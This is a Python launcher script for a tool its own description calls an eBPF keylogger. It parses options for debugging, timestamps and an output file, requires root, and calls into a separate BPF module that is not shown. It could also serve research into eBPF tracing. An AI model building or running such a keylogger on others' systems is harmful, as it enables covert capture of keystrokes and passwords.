import os, sys
import argparse

from bpf_program import BPFProgram

DESCRIPTION = """
A keylogger written in eBPF.
"""


def main(args):
    bpf = BPFProgram(args)
    bpf.main()
    print(args)


def is_root():
    return os.geteuid() == 0


def parse_args(args=sys.argv[1:]):
    parser = argparse.ArgumentParser(
        prog="bpf-keylogger",
        description=DESCRIPTION,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    # Debugging info
    parser.add_argument("--debug", action="store_true", help="Print debugging info.")

    # Timestamps
    parser.add_argument(
        "-t", "--timestamp", action="store_true", help="Print time stamps."
    )

    # Options for handling output
    output_options = parser.add_mutually_exclusive_group()
    output_options.add_argument(
        "-o", "--outfile", type=str, help="Output trace to a file instead of stdout."
    )

    args = parser.parse_args(args)

    # Check UID
    if not is_root():
        parser.error("sudo?")

    return args


if __name__ == "__main__":
    args = parse_args()
    main(args)
